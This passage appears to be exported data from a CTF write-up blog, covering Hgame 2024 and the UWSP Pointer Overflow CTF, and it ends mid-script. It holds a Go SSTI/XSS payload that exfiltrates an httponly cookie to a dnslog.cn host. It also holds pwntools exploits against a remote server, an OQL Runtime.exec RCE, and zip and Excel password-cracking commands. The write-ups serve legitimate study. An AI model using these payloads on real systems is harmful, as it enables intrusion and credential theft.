https://pkg.go.dev/github.com/gin-gonic/ginhttps://pkg.go.dev/github.com/gin-gonic/gin 看其Context下的属性和函数即可 简单选几个说明一下，具体的可以看官方文档 func 描述 ClientIP 返回访问ip ContentType contenttype Cookie 返回Cookie，这里就是XSS可以利用的地方，因为这里的Cookie是无视httponly的属性， Query 查询请求中的参数，比如请求传参为?a=123&amp;b=456，那么Query(&#39;a&#39;)返回的是&#39;123&#39; Hgame2024 Week2 梅开二度实现xss，cookie被设置为了httponly 可以用Cookie访问到这个httponly的flag 而且这个机器人什么都不会返回，所以需要外带 先写一个iframe，让机器人访问到&#x2F;flag获取cookie，等获取完之后再加载一个iframe，把数据发送出去 最终未编码的payload如下 12345678910111213141516?tmpl=&#123;&#123;print 1|.Query&#125;&#125;&amp;1=&lt;iframe src=&quot;http://127.0.0.1:8099/flag&quot; id=2&gt;&lt;/iframe&gt;&lt;script&gt;function a()&#123; var iframe=document.createElement(&quot;iframe&quot;) iframe.src=&quot;http://127.0.0.1:8099/?tmpl=&#123;&#123;print 2|.Query|.Cookie&#125;&#125;&amp;2=flag&quot; iframe.onload=function()&#123; var str=iframe.contentWindow.document.body.innerHTML.slice(59,-7) var flag=&quot;&quot; for(var i=0;i&lt;str.length;i++)&#123; flag+=str.charCodeAt(i).toString(16) &#125; fetch(&quot;http://&quot;+flag+&quot;nice.dj30m9.dnslog.cn&quot;)&#125;document.body.appendChild(iframe)&#125;document.getElementById(&#x27;2&#x27;).onload=a //用onload保证第一个iframe加载完成之后再加载第二个iframe发送cookie&lt;/script&gt; 由于题目中进行了html转义，所以单引号和双引号都不能用，所以用Query方法可以获取我们在url传的其他参数 但是&#123;&#123;.Query 1&#125;&#125;中的1会解析为int类型导致出错，&#123;&#123;.Query a&#125;&#125;会解析为函数a也会出错，所以用print将1转换为string类型，传给Query，这样就成功绕过了对tmpl的检查。 总结go ssti主要还是要去看模版解析的基类型，即&#123;&#123;.&#125;&#125;被解析为什么，然后去看这个对象有什么可以利用的方法或者属性，从而实现绕过。","tags":["ctf","2024","ssti","web","go"],"categories":["Web"]},{"title":"UWSP Pointer Overflow CTF-Writeup","path":"/2024/02/05/UWSP Pointer Overflow CTF/","content":"UWSP Pointer Overflow CTF目录 Misc Sight Without Vision Here You See A Passer By Steg Absence Makes Hearts Go Yonder An Invincible Summer Between Secrets and Lies* Web We Rest Upon a Single Hope Vigil of the Ceaseless Eyes Quantity is Not Abundance Crypto Unquestioned and Unrestrained A Pale, Violet Light Missing and Missed Crack We Mighty, We Meek* The Gentle Rocking of the Sun With Desperation and Need* Reverse Easy as it Gets A Tangled Web We Weave Sunshine on Filth is Not Polluted Forensics If You Don’t, Remember Me A Petty Wage in Regret Better to Burn in the Light Exploit My Friend, A Loathsome Worm MiscSight Without VisionHere You See A Passer By 走迷宫 1poctf&#123;uwsp_pr377y_bu7_p377y_bu7_pr377y&#125; StegAbsence Makes Hearts Go Yonder给了gif flag在文件末尾 1poctf&#123;uwsp_h342d_y0u_7h3_f1257_71m3&#125; An Invincible Summer 给了很多图片，每个图片都有两种格式，双图隐写考虑合并 随便取两张图，在sub下看到了相对奇怪的红点 保存提取，发现明文 于是写脚本来提取 12345678910111213141516171819202122232425262728293031323334353637383940import osfrom PIL import Imagefile_list=[&#x27;CD.bmp&#x27;, &#x27;CD.jpg&#x27;, &#x27;bat.bmp&#x27;, &#x27;bat.png&#x27;, &#x27;casette.bmp&#x27;, &#x27;casette.jpg&#x27;, &#x27;hand.bmp&#x27;, &#x27;hand.jpg&#x27;, &#x27;key.bmp&#x27;, &#x27;key.jpg&#x27;, &#x27;lock.bmp&#x27;, &#x27;lock.png&#x27;, &#x27;mittens.bmp&#x27;, &#x27;mittens.jpg&#x27;, &#x27;rug.bmp&#x27;, &#x27;rug.jpg&#x27;, &#x27;tapochki.bmp&#x27;, &#x27;tapochki.jpg&#x27;, &#x27;vhs.bmp&#x27;, &#x27;vhs.jpg&#x27;, &#x27;walkman.bmp&#x27;, &#x27;walkman.jpg&#x27;]def bin2bytes(data:str): res=b&#x27;&#x27; for i in range(len(data)//8): res+=int.to_bytes(int(data[i*8:i*8+8],2),1,&#x27;big&#x27;) return resdef image_sub(f1:Image.Image,f2:Image.Image,name): f3=Image.new(&#x27;1&#x27;,(f1.width,f1.height)) ch1=f1.getchannel(&#x27;R&#x27;) ch2=f2.getchannel(&#x27;R&#x27;) for i in range(f1.width): for j in range(f1.height): p1=ch1.getpixel((i,j)) p2=ch2.getpixel((i,j)) pixel=(abs(p1-p2)) f3.putpixel((i,j),pixel) f3.save(f&quot;&#123;name&#125;_sub.png&quot;) f=Image.open(f&quot;&#123;name&#125;_sub.png&quot;) data = &#x27;&#x27; for i in range(f.height): for j in range(f.width): pixel = f.getpixel((j, i)) if pixel == 255: data += &#x27;1&#x27; else: data += &#x27;0&#x27; data=bin2bytes(data) return datafor i in range(len(file_list)//2): f1=Image.open(file_list[i*2]) f2=Image.open(file_list[i*2+1]) data=image_sub(f1,f2,file_list[i*2].split(&#x27;.&#x27;)[0]) print(data.strip(b&#x27;\\x00&#x27;).decode(errors=&#x27;ignore&#x27;))#poctf&#123;uwsp_1_h4v3_n0_m0u7h_4nd_1_mu57_5cr34m&#125; Between Secrets and Lies* WebWe Rest Upon a Single Hope前端题 跑一下就出来了 1poctf&#123;uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l&#125; Vigil of the Ceaseless Eyes 一个论坛 直接访问即可 1poctf&#123;uwsp_71m3_15_4n_1llu510n&#125; Quantity is Not Abundance https://blog.csdn.net/qq_55316925/article/details/128571809https://blog.csdn.net/qq_55316925/article/details/128571809 加上Referer即可 1Referer: https://nvstgt.com/Quantity/index.html? 12poctf&#123;uwsp_1_h4v3_70_1n5157&#125; CryptoUnquestioned and Unrestrainedbase64 1poctf&#123;uwsp_411_y0u2_8453_423_8310n9_70_u5&#125; A Pale, Violet Light12345e= 5039N = 34034827C = 933969 15848125 24252056 5387227 5511551 10881790 3267174 14500698 28242580 933969 32093017 18035208 2594090 2594090 9122397 21290815 15930721 4502231 5173234 21290815 23241728 2594090 21290815 18035208 10891227 15930721 202434 202434 21290815 5511551 202434 4502231 5173234 25243036 RSA 12345678910111213from Crypto.Util.number import long_to_bytes,inversee= 5039N = 34034827p=5807q=5861C = [933969,15848125,24252056,5387227,5511551,10881790,3267174,14500698,28242580,933969,32093017,18035208,2594090,2594090,9122397,21290815,15930721,4502231,5173234,21290815,23241728,2594090,21290815,18035208,10891227,15930721,202434,202434,21290815,5511551,202434,4502231,5173234,25243036]phi=(p-1)*(q-1)d=inverse(e,phi)flag=b&#x27;&#x27;for i in C: flag+=long_to_bytes(pow(i,d,N))print(flag)#poctf&#123;uwsp_533k_4nd_y3_5h411_f1nd&#125; Missing and Missedbrainfuck 123++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.-.------------.+++++++++++++++++.--------------.+++++++++++++++++++++.------.++.----.---.-----------------.&lt;&lt;++++++++++++++++++++.-.++++++++.&gt;&gt;+++++++++.&lt;&lt;--.&gt;&gt;---------.++++++++++++++++++++++++.&lt;&lt;-----.--.&gt;&gt;---------.&lt;&lt;+++++++++.&gt;&gt;---------------.&lt;&lt;---------.++.&gt;&gt;.+++++++.&lt;&lt;--.++.+++++++.---------.+++++++..----.&gt;&gt;++++++++.+++++++++++++++.poctf&#123;uwsp_219h7_w20n9_02_f0290773n&#125; CrackWe Mighty, We Meek* excel密码爆破 12office2john crack1.xls &gt; hash.txtjohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt The Gentle Rocking of the Sun https://crackstation.net/https://crackstation.net/ 1zwischen 解压出来还是个嵌套的文件夹 123456789101112131415import osdir= &#x27;2023&#x27;flag=&#x27;&#x27;while True: lst=os.listdir(dir) if &#x27;.DS_Store&#x27; in lst: lst.remove(&#x27;.DS_Store&#x27;) if lst: dir= dir + &#x27;/&#x27; + lst[0] flag+=lst[0] else: breakprint(flag)#poctf&#123;uwsp_c411f02n14_d234m1n9&#125; With Desperation and Need* veracrypt加密卷爆破密码 ReverseEasy as it Gets1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465[Reflection.Assembly]::LoadWithPartialName(&quot;System.Security&quot;) function Encrypt-String($String, $Passphrase, $salt=&quot;SaltCrypto&quot;, $init=&quot;IV_Password&quot;, [switch]$arrayOutput) &#123; $r = new-Object System.Security.Cryptography.RijndaelManaged $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) $salt = [Text.Encoding]::UTF8.GetBytes($salt) $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, &quot;SHA1&quot;, 5).GetBytes(32) #256/8 $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] $c = $r.CreateEncryptor() $ms = new-Object IO.MemoryStream $cs = new-Object Security.Cryptography.CryptoStream $ms,$c,&quot;Write&quot; $sw = new-Object IO.StreamWriter $cs $sw.Write($String) $sw.Close() $cs.Close() $ms.Close() $r.Clear() [byte[]]$result = $ms.ToArray() return [Convert]::ToBase64String($result) &#125; function Decrypt-String($Encrypted, $Passphrase, $salt=&quot;SaltCrypto&quot;, $init=&quot;IV_Password&quot;) &#123; if($Encrypted -is [string])&#123; $Encrypted = [Convert]::FromBase64String($Encrypted) &#125; $r = new-Object System.Security.Cryptography.RijndaelManaged $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) $salt = [Text.Encoding]::UTF8.GetBytes($salt) $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, &quot;SHA1&quot;, 5).GetBytes(32) #256/8 $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] $d = $r.CreateDecryptor() $ms = new-Object IO.MemoryStream @(,$Encrypted) $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,&quot;Read&quot; $sr = new-Object IO.StreamReader $cs Write-Output $sr.ReadToEnd() $sr.Close() $cs.Close() $ms.Close() $r.Clear() &#125; cls #### # TODO: use strong password # Canadian_Soap_Opera ### $pwd = read-host &quot;(Case Sensitive) Please Enter User Password&quot; $pcrypted = &quot;TTpgx3Ve2kkHaFNfixbAJfwLqTGQdk9dkmWJ6/t0UCBH2pGyJP/XDrXpFlejfw9d&quot; write-host &quot;Encrypted Password is: $pcrypted&quot; write-host &quot;&quot; write-host &quot;Testing Decryption of Username / Password...&quot; write-host &quot;&quot; $pdecrypted = Decrypt-String $pcrypted $pwd write-host &quot;Decrypted Password is: $pdecrypted&quot; 1poctf&#123;uwsp_4d_v1c70r14m_w4573l4nd3r&#125; A Tangled Web We Weave12345678910111213141516171819202122232425262728293031323334353637section .data encoded_message db 0x0F, 0x10, 0x1C, 0x0B, 0x19, 0x04, 0x0A, 0x08, 0x0C, 0x0F, 0x20, 0x14, 0x4E, 0x11, 0x46, 0x20, 0x14, 0x4F, 0x11, 0x46, 0x20, 0x46, 0x4F, 0x48, 0x20, 0x11, 0x4F, 0x48, 0x17, 0x4E, 0x11, 0x46, 0x20, 0x4F, 0x11, 0x20, 0x12, 0x4C, 0x02section .text global _start_start: mov ecx, 0 mov edi, encoded_message find_length: cmp byte [edi], 0 je print_message inc ecx inc edi jmp find_length print_message: xor esi, esi mov edi, encoded_message decode: xor eax, eax mov al, byte [edi + esi] xor al, ; something missing? mov byte [edi + esi], al inc esi cmp byte [edi + esi], 0 jne decode mov edx, ecx mov eax, 4 mov ebx, 1 mov ecx, encoded_message int 0x80 mov eax, 1 xor ebx, ebx int 0x80 一眼异或加密 1poctf&#123;uwsp_k1n9_k0n9_907_n07h1n9_0n_m3&#125; Sunshine on Filth is Not Polluted hint为 1Uninitialized variables 在login里面可以得到shell authcode是随机生成的 这里的confire username的username是没有初始化的，而且调试发现恰好此时local_18就是之前残留的auth_code的值 所以exp如下 123456789101112from pwn import *p=remote(&#x27;34.123.210.162&#x27;,&#x27;20231&#x27;)p.sendlineafter(b&#x27;(3) Done: &#x27;,b&#x27;2&#x27;)data=p.recvline().strip()[-2:]auth_code=int.from_bytes(data,&#x27;little&#x27;)p.sendlineafter(b&#x27;(3) Done: &#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;Username: &#x27;,b&#x27;admin&#x27;)p.sendlineafter(b&#x27;(3) Done: &#x27;,b&#x27;3&#x27;)p.sendlineafter(b&#x27;Enter your authentication code: &#x27;,str(auth_code).encode())p.interactive()#poctf&#123;uwsp_7h3_1355_y0u_kn0w_7h3_837732&#125; ForensicsIf You Don’t, Remember Me 1poctf&#123;uwsp_w31c0m3_70_7h3_94m3&#125; A Petty Wage in Regret 给了一张图片 图片锐度明显有问题 第一部分在exif信息的ascii里 1poctf&#123;uwsp_7h3_w0rld_h4d_17_f1257&#125; Better to Burn in the Light 从磁盘文件中恢复文件 Master File Table binwalk可以得到第一个flag 通过exif信息中的CLUE，可以找到第二张图 1poctf&#123;uwsp_5h1v3r_m3_71mb3r5&#125; Exploit随便做了一道后面没做了 My Friend, A Loathsome Worm 在输入username的地方溢出，将loacl_1c的位置覆盖为0x539即可 12345678910from pwn import *p=remote(&#x27;34.123.210.162&#x27;,20232)p.sendlineafter(b&#x27;Choice: &#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;Enter new username: &#x27;,b&#x27;a&#x27;*28+b&#x27;\\x39\\x05&#x27;)p.sendlineafter(b&#x27;Choice: &#x27;,b&#x27;3&#x27;)p.interactive()#poctf&#123;uwsp_5w337_c10v32_4nd_50f7_511k&#125;","tags":["UWSP-CTF","ctf","2024"],"categories":["Writeups"]},{"title":"Hgame2024 Week1-Writeup","path":"/2024/02/05/Hgame2024-Week1 Writeup/","content":"Week1目录 Misc 来自星尘的问候 希儿希儿希尔 simple-attack Web Bypass it ezHTTP Select Courses 2048*16 jhat Re ezPYC Crypto ezRSA ezMath ezPRNG 奇怪的图片 Pwn ezshellcode Elden Random Challenge ezfmt string Elden Ring Ⅰ Misc来自星尘的问候 https://my1l.github.io/Ctrl/CtrlAstr.htmlhttps://my1l.github.io/Ctrl/CtrlAstr.html 12hgame&#123;welc0me!&#125; 希儿希儿希尔crc修复 lsb隐写 hill加密 1CVOCRJGMKLDJGBQIUIVXHEYLPNWR 1DISAPPEARINTHESEAOFBUTTERFLY simple-attackzip明文攻击 12./bkcrack -C /Users/zhou39512/CTF/HGAME2024/Week1/Misc/simple_attack/src/attachment.zip -c 103223779_p0.jpg -P /Users/zhou39512/CTF/HGAME2024/Week1/Misc/simple_attack/src/src.zip -p 103223779_p0.jpg https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.htmlhttps://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html 生成新密码为123的zip 1./bkcrack -C /Users/zhou39512/CTF/HGAME2024/Week1/Misc/simple_attack/src/attachment.zip -c 103223779_p0.jpg -k e423add9 375dcd1c 1bce583e -U new_zip_123.zip 123 解压得到 WebBypass it不给注册，直接向register.php发请求就能注册成功 ezHTTP1234X-real-Ip: 127.0.0.1Referer:vidar.clubUser-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 1hgame&#123;HTTP_!s_1mP0rT4nt&#125; Select Courses无大语，有人随机退课，一直选课就行，总能选到 1hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125; 2048*16js混淆 搜索won定位到关键处 直接所有代码复制 打印t jhatOQL RCE https://www.wenjiangs.com/doc/7tsoxdy9nldrhttps://www.wenjiangs.com/doc/7tsoxdy9nldr https://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.mdhttps://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.md 12345678a=java.lang.Runtime.getRuntime().exec(&#x27;cat /flag&#x27;).getInputStream();b=new java.io.InputStreamReader(a);c=new java.io.BufferedReader(b);while(c.ready())&#123;d+=c.readLine()+&#x27; &#x27;;&#125; ReezPYCpycdas反编译 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138[Code] File Name: ezPYC.py Object Name: &lt;module&gt; Qualified Name: &lt;module&gt; Arg Count: 0 Pos Only Arg Count: 0 KW Only Arg Count: 0 Stack Size: 5 Flags: 0x00000000 [Names] &#x27;flag&#x27; &#x27;c&#x27; &#x27;input&#x27; &#x27;range&#x27; &#x27;i&#x27; &#x27;ord&#x27; &#x27;print&#x27; &#x27;exit&#x27; [Locals+Names] [Constants] ( 87 75 71 69 83 121 83 125 117 106 108 106 94 80 48 114 100 112 112 55 94 51 112 91 48 108 119 97 115 49 112 112 48 108 100 37 124 2 ) ( 1 2 3 4 ) &#x27;plz input flag:&#x27; 0 36 1 4 &#x27;Sry, try again...&#x27; &#x27;Wow!You know a little of python reverse&#x27; None [Disassembly] 0 RESUME 0 2 BUILD_LIST 0 4 LOAD_CONST 0: (87, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2) 6 LIST_EXTEND 1 8 STORE_NAME 0: flag 10 BUILD_LIST 0 12 LOAD_CONST 1: (1, 2, 3, 4) 14 LIST_EXTEND 1 16 STORE_NAME 1: c 18 PUSH_NULL 20 LOAD_NAME 2: input 22 LOAD_CONST 2: &#x27;plz input flag:&#x27; 24 PRECALL 1 28 CALL 1 38 STORE_NAME 2: input 40 PUSH_NULL 42 LOAD_NAME 3: range 44 LOAD_CONST 3: 0 46 LOAD_CONST 4: 36 48 LOAD_CONST 5: 1 50 PRECALL 3 54 CALL 3 64 GET_ITER 66 FOR_ITER 62 (to 192) 68 STORE_NAME 4: i 70 PUSH_NULL 72 LOAD_NAME 5: ord 74 LOAD_NAME 2: input 76 LOAD_NAME 4: i 78 BINARY_SUBSCR 88 PRECALL 1 92 CALL 1 102 LOAD_NAME 1: c 104 LOAD_NAME 4: i 106 LOAD_CONST 6: 4 108 BINARY_OP 6 (%) 112 BINARY_SUBSCR 122 BINARY_OP 12 (^) 126 LOAD_NAME 0: flag 128 LOAD_NAME 4: i 130 BINARY_SUBSCR 140 COMPARE_OP 3 (!=) 146 POP_JUMP_FORWARD_IF_FALSE 21 (to 190) 148 PUSH_NULL 150 LOAD_NAME 6: print 152 LOAD_CONST 7: &#x27;Sry, try again...&#x27; 154 PRECALL 1 158 CALL 1 168 POP_TOP 170 PUSH_NULL 172 LOAD_NAME 7: exit 174 PRECALL 0 178 CALL 0 188 POP_TOP 190 JUMP_BACKWARD 63 192 PUSH_NULL 194 LOAD_NAME 6: print 196 LOAD_CONST 8: &#x27;Wow!You know a little of python reverse&#x27; 198 PRECALL 1 202 CALL 1 212 POP_TOP 214 LOAD_CONST 9: None 216 RETURN_VALUE 187, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2 异或1，2，3，4 1VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125; CryptoezRSA123456789101112131415161718192021from Crypto.Util.number import *from secret import flagm=bytes_to_long(flag)p=getPrime(1024)q=getPrime(1024)n=p*qphi=(p-1)*(q-1)e=0x10001c=pow(m,e,n)leak1=pow(p,q,n)leak2=pow(q,p,n)print(f&#x27;leak1=&#123;leak1&#125;&#x27;)print(f&#x27;leak2=&#123;leak2&#125;&#x27;)print(f&#x27;c=&#123;c&#125;&#x27;)&quot;&quot;&quot;leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971&quot;&quot;&quot; $$\\begin{align}p^q\\mod pq&#x3D;leak_1\\\\p^q-kpq&#x3D;leak_1\\\\p(p^{q-1}-kq)&#x3D;leak_1\\\\\\end{align}$$ 经检验leak均为素数，说明leak即为p和q 1hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125; ezMath1234567891011121314151617from Crypto.Util.number import *from Crypto.Cipher import AESimport random,stringfrom secret import flag,y,xdef pad(x): return x+b&#x27;\\x00&#x27;*(16-len(x)%16)def encrypt(KEY): cipher= AES.new(KEY,AES.MODE_ECB) encrypted =cipher.encrypt(flag) return encryptedD = 114514assert x**2 - D * y**2 == 1 flag=pad(flag)key=pad(long_to_bytes(y))[:16]enc=encrypt(key)print(f&#x27;enc=&#123;enc&#125;&#x27;)#enc=b&quot;\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5&#x27;\\x93\\xf8\\xde\\xb2\\x9a\\x9a&quot; 连分数解佩尔方程 https://blog.csdn.net/wh2124335/article/details/8871535https://blog.csdn.net/wh2124335/article/details/8871535 https://gist.github.com/samueltardieu/717308https://gist.github.com/samueltardieu/717308 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESdef pell (D): &quot;&quot;&quot;Return the smallest integer set solving Pell equation x^2-D*y^2=1 where x, D and y are positive integers. If there are no solution (D is a square), return None.&gt;&gt;&gt; pell(3) (2, 1) &quot;&quot;&quot; a0 = int (D**0.5) if a0*a0 == D: return None gp = [0, a0] gq = [1, D-a0**2] a = [a0, int((a0+gp[1])/gq[1])] p = [a[0], a[0]*a[1]+1] q = [1, a[1]] maxdepth = None n = 1 while maxdepth is None or n &lt; maxdepth: if maxdepth is None and a[-1] == 2*a[0]: r = n-1 if r % 2 == 1: return p[r], q[r] maxdepth = 2*r+1 n += 1 gp.append (a[n-1]*gq[n-1]-gp[n-1]) gq.append ((D-gp[n]**2)//gq[n-1]) a.append (int ((a[0]+gp[n])//gq[n])) p.append (a[n]*p[n-1]+p[n-2]) q.append (a[n]*q[n-1]+q[n-2]) return p[2*r+1], q[2*r+1]def pad(x): return x+b&#x27;\\x00&#x27;*(16-len(x)%16)if __name__ == &#x27;__main__&#x27;: x,y=pell(114514) key = pad(long_to_bytes(y))[:16] cipher= AES.new(key,AES.MODE_ECB) enc=b&quot;\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5&#x27;\\x93\\xf8\\xde\\xb2\\x9a\\x9a&quot; flag=cipher.decrypt(enc) print(flag)#hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125; ezPRNG1234567891011121314151617181920212223242526272829from Crypto.Util.number import *import uuiddef PRNG(R,mask): nextR = (R &lt;&lt; 1) &amp; 0xffffffff i=(R&amp;mask)&amp;0xffffffff nextbit=0 while i!=0: nextbit^=(i%2) i=i//2 nextR^=nextbit return (nextR,nextbit)R=str(uuid.uuid4())flag=&#x27;hgame&#123;&#x27;+R+&#x27;&#125;&#x27;print(flag)R=R.replace(&#x27;-&#x27;,&#x27;&#x27;)Rlist=[int(R[i*8:i*8+8],16) for i in range(4)]mask=0b10001001000010000100010010001001output=[]for i in range(4): R=Rlist[i] out=&#x27;&#x27; for _ in range(1000): (R,nextbit)=PRNG(R,mask) out+=str(nextbit) output.append(out)print(f&#x27;output=&#123;output&#125;&#x27;) 目标是恢复R 一位一位往前推就可以 123爆破位-┐ res-┐ v v ? 1111110110111011110000101011010 0 12345678910111213141516171819202122232425262728293031323334output = [ &#x27;1111110110111011110000101011010001000111111001111110100101000011110111111100010000111110110111100001001000101101011110111100010010100000011111101101110101011010111000000011110000100011101111011011000100101100110100101110001010001101101110000010001000111100101010010110110111101110011011001011111011010101011000011011000111011011111001101010111100101100110001011010010101110011101001100111000011110111000001101110000001111100000100000101111100010110111001110011010000011011110110011000001101011111111010110011010111010101001000010011110110011110110101011110111010011010010110111111010011101000110101111101111000110011111110010110000100100100101101010101110010101001101010101011110111010011101110000100101111010110101111110001111111110010000000001110011100100001011111110100111011000101001101001110010010001100011000001101000111010010000101101111101011000000101000001110001011001010010001000011000000100010010010010111010011111111011100100100100101111111001110000111110110001111001111100101001001100010&#x27;, &#x27;0010000000001010111100001100011101111101111000100100111010101110010110011001011110101100011101010000001100000110000000011000000110101111111011100100110111011010000100011111000111001000101001110010110010001000110010101011110011101000011111101101011000011110001101011111000110111000011000110011100100101100111100000100100101111001011101110001011011111111011010100010111011000010010101110110100000110100000100010101000010111101001000011000000000111010010101010111101101011111011001000101000100011001100101010110110001010010001010110111011011111101011100111001101111111111010011101111010010011110011111110100110011111110110001000111100010111000101111000011011011111101110101110100111000011100001010110111100011001011010011010111000110101100110100011101101011101000111011000100110110001100110101010110010011011110000111110100111101110000100010000111100010111000010000010001111110110100001000110110100100110110010110111010011111101011110000011101010100110101011110000110101110111011010110110000010000110001&#x27;, &#x27;1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001&#x27;, &#x27;0001101010101010100001001001100010000101010100001010001000100011101100110001001100001001110000110100010101111010110111001101011011101110000011001000100100101000011011101000111001001010011100010001010110111011100100111110111001010010111010100000100111110101110010010110100001000010010001101111001110100010001011101100111011101011101100100101011010101000101001000101110011011111110110011111111100000000011100000010011000110001000110101010001011000010101000110000101001110101010111011010010111011001010011100010101001100110000110101100010000100110101110100001101001011011110011100110011001010110100101010111110110111100000111010001111101110000000000111011011101000011001010010111001110111000100111011110100101000100011011101100011111000101110110110111111001111000000011100011000010000101001011001101110101000010101001000100110010000101001111100101000001011011010011110001101000001101111010100101001100010100000111000011110101010100011011001110001011110111010111011010101101100000110000001010010101111011&#x27;]mask = 0b10001001000010000100010010001001def PRNG(R, mask): nextR = (R &lt;&lt; 1) &amp; 0xffffffff i = (R &amp; mask) &amp; 0xffffffff nextbit = 0 while i != 0: nextbit ^= (i % 2) i = i // 2 nextR ^= nextbit return (nextR, nextbit)for i in output: a = i[:31] res = int(i[31]) uid=&#x27;&#x27; for _ in range(32): if PRNG(int(&#x27;1&#x27; + a, 2), mask)[1] == res: uid=&#x27;1&#x27;+uid a=&#x27;1&#x27;+a else: uid=&#x27;0&#x27;+uid a=&#x27;0&#x27;+a res=int(a[-1]) a=a[:-1] print(hex(int(uid,2))[2:],end=&#x27; &#x27;) 奇怪的图片1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import timefrom PIL import Image, ImageDraw, ImageFontimport threadingimport randomimport secretsflag = &quot;hgame&#123;fake_flag&#125;&quot;def generate_random_image(width, height): image = Image.new(&quot;RGB&quot;, (width, height), &quot;white&quot;) pixels = image.load() for x in range(width): for y in range(height): red = random.randint(0, 255) green = random.randint(0, 255) blue = random.randint(0, 255) pixels[x, y] = (red, green, blue) return imagedef draw_text(image, width, height, token): font_size = random.randint(16, 40) font = ImageFont.truetype(&quot;arial.ttf&quot;, font_size) text_color = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)) x = random.randint(0, width - font_size * len(token)) y = random.randint(0, height - font_size) draw = ImageDraw.Draw(image) draw.text((x, y), token, font=font, fill=text_color) return imagedef xor_images(image1, image2): if image1.size != image2.size: raise ValueError(&quot;Images must have the same dimensions.&quot;) xor_image = Image.new(&quot;RGB&quot;, image1.size) pixels1 = image1.load() pixels2 = image2.load() xor_pixels = xor_image.load() for x in range(image1.size[0]): for y in range(image1.size[1]): r1, g1, b1 = pixels1[x, y] r2, g2, b2 = pixels2[x, y] xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2) return xor_imagedef generate_unique_strings(n, length): unique_strings = set() while len(unique_strings) &lt; n: random_string = secrets.token_hex(length // 2) unique_strings.add(random_string) return 